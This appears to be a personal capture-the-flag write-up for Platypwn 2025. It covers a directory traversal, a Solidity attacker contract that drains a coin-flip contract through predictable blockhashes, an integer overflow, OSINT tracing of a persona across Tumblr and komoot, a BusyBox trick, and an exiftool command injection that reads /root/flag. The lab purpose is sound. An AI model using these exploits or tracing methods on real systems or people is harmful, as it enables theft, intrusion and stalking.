# CTF: Platypwn 2025 (Jeopardy)

Here are my solutions for the 2025 edition of Platypwn CTF.

### Pwn: Fileserver (Part 1)

The first part is a directory traversal.

1. Make a GET request to: `<IP>/../../../../../../home/app/flag`

**Flag**: `PP{h4_h4___c14551c::[a-zA-Z0-9]{12}}`

### Web3: Coin Flip challenge

The exploit is in the fact that block numbers are incremental, and as such you can wait for a valid block number (which will yield a valid hash).

Once you have a valid number that will satisfy the constraint for a coin flip, you can write an Attacker smart contract that will do as many flips as required **in a single transaction** (so that they're all in the same block).

1. Download the challenge files (the contracts)
2. Set up a Web3.py script to compile them:

```py
# Compile the "contracts/Setup.sol" contract and get the ABI and bytecode
from solcx import install_solc, compile_standard
import json

COMPILE_OPTIONS = {
    "language": "Solidity",
    "settings": {
        "outputSelection": {
            "*": {
                "*": ["abi", "evm.bytecode"]
            }
        }
    }
}

CONTRACTS = ["Setup.sol", "Chal.sol", "Attacker.sol"]
SOLC_VERSION = "0.8.13"

install_solc(SOLC_VERSION)

for contract in CONTRACTS:
    COMPILE_OPTIONS["sources"] = {contract: {"content": ""}}

    with open(f"contracts/{contract}", "r") as file:
        setup_source = file.read()
    
    COMPILE_OPTIONS["sources"][contract]["content"] = setup_source
    
    compiled_sol = compile_standard(COMPILE_OPTIONS, solc_version=SOLC_VERSION)
    
    with open(f"compiled_{contract}.json", "w") as file:
        json.dump(compiled_sol, file, indent=4)
```

3. Write an `Attacker` contract like so:

```solidity
pragma solidity ^0.8.13;

import "./contracts/Chal.sol";

contract Attacker {
    Chal public target;

    constructor(address payable _target) {
        target = Chal(_target);
    }

    receive() external payable {
        // Do nothing, just accept ether
    }

    function attack() external payable {
        // DO NOT ATTACK IF WE WOULD LOSE!
        require(
            uint256(blockhash(block.number - 1)) % 2 == 0,
            "Unfavorable flip, aborting"
        );

        // Each successful flip drains 1 ETH if won. We must do 91 flips to drain from 100 ETH to below 10 ETH.
        uint flips = 91;
        uint amount = msg.value; // This should be between 0.05 and 5 ETH

        for (uint i = 0; i < flips; i++) {
            target.flip{value: amount}();
        }
    }
}
```

Now, write a `main.py` script and:

1. Connect to the network (get an instance by speaking to the instancer with `nc <IP> 31337`)
2. Use the provided `Setup` contract to get `TARGET`, aka the address of the `Chal` contract
3. Run attacks endlessly to increase the block number
   1. A block is mined immediately on every transaction.
4. The attacker should revert attacks if the constraint isn't satisfied
5. If it is, it should flip at least 91 times.
6. `main.py` should ensure that the `Chal` contract's balance is below 10 ETH.
7. Speak to the instancer again and tell it to give you the flag.

**Flag**: `PP{1_c4n_533_y0ur_futur3::[a-zA-Z0-9]{12}}`

### Web3: Unfair Trade

This is a simple integer overflow.

1. Recognise that the contract is compiled with a version of the Solidity compiler ≤ 0.8.0.
	- This means integer overflows are unchecked and will pass through
2. If `fee` exceeds `amount * 90%`, the output amount will jump up to `150 ether` and transfer them to the attacker.

**Flag**: (I was not the one submitting this one)

### OSINT: Mean Kitty

1. Recognise the design of the post embed in the picture
    - It's Tumblr
2. Tumblr profiles follow the URL: `<username>.tumblr.com`
3. Go on https://kittycat060.tumblr.com/
4. Look through the posts and find:
    1. > platy pwnies should watch out for their flags... me and my fellow kitties are going to eat them all up, watch out!
       1. Comment: > 5398925160033 is my id over there, but shht!
    2. > if you like to chat about cats with me, send me a question or just shoot me a mail at evilkitty07 (at) proton (dot) me :D
5. Go on https://osint.rocks/holehe_search and look up the email: evilkitty07@proton.me
6. Output: 

```
Twitter : @palenath
Github : https://github.com/megadose/holehe
For BTC Donations : 1FHDM49QfZX6pJmhjLE5tB2K6CaTLMZpXZ

***************************
   evilkitty07@proton.me
***************************
[+] komoot.com
[+] protonmail.ch / Date, time of the creation 2025-11-10 18:28:41

[+] Email used, [-] Email not used, [x] Rate limit
121 websites checked in 10.12 seconds
Twitter : @palenath
Github : https://github.com/megadose/holehe
For BTC Donations : 1FHDM49QfZX6pJmhjLE5tB2K6CaTLMZpXZ
```

7. This tells us:
   1. The email was only created recently (correct)
   2. The email is only used on another website, `komoot` (a hiking trail website)
8. Go on `komoot` and make an account
9. Visit your own profile and replace the ID with: `5398925160033` (we found this on Tumblr)

**Flag**: `PP{g0oD_j0B_tr4ck1n6_k1773n5}`

### Misc: Copy Pasta

The Rust binary runs in a strict environment.

If you try to run any of the binaries it allows you to use, without providing the necessary arguments you get a hint. The binary will print out "BusyBox".

BusyBox is one binary that behaves like all of the common Unix utilities based on how it's renamed: `ls`, `cat`, `echo`...

To solve this challenge:
1. `cp echo printenv`: copies the `busybox` binary and renames it `printenv`
2. `printenv`: running it will make `busybox` behave like `printenv`, giving you the flag.

**Flag**: `PP{after-arbitrary-file-write-and-read-comes-execute::[a-zA-Z0-9]{12}}`

### Misc: Photofriend (Part 1 and 2)

Photofriend is a single Python Flask app to modify images.

It calls `exiftool` from `subprocess.Popen` to add the metadata the user asks, letting them pick a tag and a value.

The vulnerability is a command injection. The provided folder contains multiple examples of what's possible:

1. `main.py`: interactive shell
2. `execute.py` (and `payload.py`): Python 3.12 script executor (the payload)
3. `read.py`: reads any file accessible by the user `platypus` and saves the contents

The command injection to send via `main.py` is:

```bash
/usr/local/bin/ensure-exiftool -overwrite_original -Comment<=/root/flag ./temp/<some_temp_file>.png
```

You can get the path of a temp file by using:

```bash
ls ./temp
```

**Flag**: (forgot to save it lol)
